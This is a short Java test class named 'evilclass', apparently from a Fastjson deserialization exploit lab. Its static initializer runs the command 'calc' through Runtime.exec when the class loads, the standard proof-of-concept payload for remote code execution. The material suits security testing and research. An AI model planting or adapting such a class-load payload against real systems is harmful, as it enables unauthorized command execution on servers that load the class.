//测试用的

package com.example.fastjsonmem.JDBC;

import java.lang.Runtime;
import java.lang.Process;

public class evilclass {
    static {
        try {
            Runtime rt = Runtime.getRuntime();
            String[] commands = {"calc"};
            Process pc = rt.exec(commands);
            pc.waitFor();
        } catch (Exception e) {// do nothing}}}

        }
    }
}